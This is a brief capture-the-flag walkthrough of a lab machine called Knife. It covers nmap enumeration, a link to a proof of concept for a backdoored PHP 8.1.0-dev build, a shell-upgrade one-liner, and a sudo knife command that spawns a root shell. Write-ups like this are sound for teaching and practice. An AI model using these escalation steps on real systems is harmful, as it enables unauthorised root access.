# About
Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell. 

# Enumeration
```
nmap 10.129.106.194 -p- -sV -sC --open
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# Web Enum
php version `8.1.0-dev` [POC](https://www.exploit-db.com/exploits/49933)


# Exploit

![](Images/Pasted%20image%2020250502115610.png)


# Priv Esc


![](Images/Pasted%20image%2020250502115644.png)

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

https://gtfobins.github.io/gtfobins/knife/

```
sudo knife exec -E 'exec "/bin/sh"'
```

![](Images/Pasted%20image%2020250502121528.png)